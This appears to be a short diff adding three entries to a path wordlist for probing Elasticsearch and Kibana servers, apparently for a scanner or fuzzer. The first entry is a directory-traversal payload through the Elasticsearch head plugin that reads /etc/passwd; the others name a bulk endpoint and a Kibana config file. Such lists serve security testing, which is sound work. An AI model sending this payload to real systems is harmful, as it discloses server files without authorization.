@@ -1,0 +1,3 @@
+/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd
+/_bulk
+/kibana.yml
